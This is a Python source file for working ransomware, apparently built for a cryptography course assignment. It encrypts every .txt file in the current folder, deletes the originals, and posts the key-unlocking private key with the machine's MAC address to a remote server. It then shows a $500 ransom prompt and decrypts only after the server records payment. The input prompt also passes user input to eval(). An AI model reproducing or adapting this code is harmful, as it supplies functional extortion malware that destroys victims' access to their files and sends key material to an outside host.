from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random
import os, string, random, seccure, requests, json
from uuid import getnode as get_mac
import pickle

file_extension_signature='.TYENCRYPTED'
uuid = get_mac()
BASE_URL = "https://crypto-assignment.herokuapp.com/api/"
user_id = uuid
error_code = 'code'
encrypted_pw_file_name = "DO_NOT_DELETE.p"

def derive_key_and_iv(password, salt, key_length, iv_length):
    d = d_i = b''  # changed '' to b''
    while len(d) < key_length + iv_length:
        # changed password to str.encode(password)
        d_i = md5(d_i + str.encode(password) + salt).digest()
        d += d_i
    return d[:key_length], d[key_length:key_length+iv_length]

def encrypt(in_file, out_file, password, salt_header='TYPRANK_', key_length=32):
    # added salt_header=''
    bs = AES.block_size
    # replaced Crypt.Random with os.urandom
    salt = os.urandom(bs - len(salt_header))
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # changed 'Salted__' to str.encode(salt_header)
    out_file.write(str.encode(salt_header) + salt)
    finished = False
    while not finished:
        chunk = in_file.read(1024 * bs)
        if len(chunk) == 0 or len(chunk) % bs != 0:
            padding_length = (bs - len(chunk) % bs) or bs
            # changed right side to str.encode(...)
            chunk += str.encode(
                padding_length * chr(padding_length))
            finished = True
        out_file.write(cipher.encrypt(chunk))

def decrypt(in_file, out_file, password, salt_header='TYPRANK_', key_length=32):
    # added salt_header=''
    bs = AES.block_size
    # changed 'Salted__' to salt_header
    salt = in_file.read(bs)[len(salt_header):]
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    next_chunk = ''
    finished = False
    while not finished:
        chunk, next_chunk = next_chunk, cipher.decrypt(
            in_file.read(1024 * bs))
        if len(next_chunk) == 0:
            padding_length = chunk[-1]  # removed ord(...) as unnecessary
            chunk = chunk[:-padding_length]
            finished = True
        out_file.write(bytes(x for x in chunk))  # changed chunk to bytes(...)

def encrypt_file(in_file_name, password, signature='TYPRANK_'):
    out_file_name = in_file_name[:-(len('.txt'))] + file_extension_signature
    with open(in_file_name, 'rb') as in_file, open(out_file_name, 'wb') as out_file:
        encrypt(in_file, out_file, password)

def decrypt_file(in_file_name, password, signature='TYPRANK_'):
    out_file_name = in_file_name[:-len(file_extension_signature)] + '.txt'
    with open(in_file_name, 'rb') as in_file, open(out_file_name, 'wb') as out_file:
        decrypt(in_file, out_file, password)

filtered_decrypted_files = [x for x in os.listdir('.') if x.endswith('.txt')]
filtered_encrypted_files = [x for x in os.listdir('.') if x.endswith(file_extension_signature)]

def iterate_and_func_through_directory(files_list, func, password='isa16bitpassword'):
    for i in files_list:
        func(i, password)

def remove_original_files(files_list=filtered_decrypted_files):
    for i in files_list:
        os.remove(i)

def remove_encrypted_files(files_list=filtered_encrypted_files):
    for i in files_list:
        os.remove(i)

def encrypt_all_text_file(files_list=filtered_decrypted_files, password='isa16bitpassword'):
    update_files()
    iterate_and_func_through_directory(files_list, encrypt_file, password)
    remove_original_files()


def decrypt_all_text_file(files_list=filtered_encrypted_files, password='isa16bitpassword'):
    iterate_and_func_through_directory(files_list, decrypt_file, password)
    remove_encrypted_files(files_list)

def generate_16_bytes_string():
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16))

def write_to_file(file_name, text):
    f = open(file_name, 'w')
    f.write(text)
    f.close()

def update_files():
    global filtered_decrypted_files, filtered_encrypted_files
    filtered_decrypted_files = [x for x in os.listdir('.') if x.endswith('.txt')]
    filtered_encrypted_files = [x for x in os.listdir('.') if x.endswith(file_extension_signature)]

e_sym_pw_local = None
e_sym_pw_local_is_stored = False

try:
    e_sym_pw_local = pickle.load(open(encrypted_pw_file_name, 'rb'))
    e_sym_pw_local_is_stored = True
except:
    print('Hey guess who\'s new to this ;)?')

#When user first launches the py program
if(e_sym_pw_local_is_stored == False):
    #Generate random 16 byte string for symmetric key
    sym_pw = generate_16_bytes_string()
    # print('ORIG SYM PW', sym_pw)
    encrypt_all_text_file(password=sym_pw)
    #Generate random 16 bytes string for priv key
    ecc_priv_key = generate_16_bytes_string()
    #Generate pub key from priv key
    ecc_pub_key = seccure.passphrase_to_pubkey(ecc_priv_key.encode(encoding="UTF-8"))
    #Encrypt sym key with pub key
    e_sym_pw = seccure.encrypt(sym_pw.encode(encoding="UTF-8"), str(ecc_pub_key).encode(encoding="UTF-8"))
    #Decrypt sym key with priv key
    # d_sym_pw = seccure.decrypt(bytes(e_sym_pw), bytes(ecc_priv_key))
    # e_sym_pw_local = ":".join(x.encode('hex') for x in e_sym_pw)
    e_sym_pw_local = e_sym_pw
    pickle.dump(e_sym_pw_local, open(encrypted_pw_file_name, 'wb'))
    #Computer uuid
    # print(uuid)
    r = requests.post(BASE_URL, json={'id': user_id, 'key': ecc_priv_key})
    result_dict = r.json()
    print(result_dict)

print('Hehe we\'ve encrypted all your files :)')
print('''
1) Decrypt
2) Pay for it ($500!!!)
3) Exit
''')

input_choice = eval(input('So what do you do now? You gotta pay before you decrypt hehe :)))'))
while True:
    #User wants to decrypt
    if input_choice == 1:

        r = requests.get(BASE_URL+str(user_id)).json()
        if r[error_code] == 100:
            print('Your key is nowhere to be found... Guess you can no longer access your files :(')
        elif r[error_code] == 101:
            print('Pay for it first to get your files back :)')
        elif r[error_code] == 2:
            #User has paid, decrypt files
            print('Alright here you go all nicely decrypted !')
            ecc_priv_key_server = r['key']
            # print('server_key', ecc_priv_key_server)
            e_sym_pw_local = pickle.load(open(encrypted_pw_file_name, 'rb'))
            d_sym_pw = str(seccure.decrypt(e_sym_pw_local, ecc_priv_key_server.encode(encoding="UTF-8")), "UTF-8")
            # print('TYPE OF DSYM', type(d_sym_pw))
            # print(filtered_encrypted_files)
            decrypt_all_text_file(files_list=filtered_encrypted_files,password=d_sym_pw)
            os.remove(encrypted_pw_file_name)
            r = requests.delete(BASE_URL+str(user_id)).json()
    #User wants to Pay
    elif input_choice == 2:
        r = requests.put(BASE_URL+str(user_id)).json()
        if r[error_code] == 1:
            print('Thank you for paying :) Get yours decrypted by selection option 1!')
            update_files()
        else:
            print('Please try again')
    elif input_choice == 3:
        break
    else:
        break
    input_choice = eval(input('Anything else?: '))
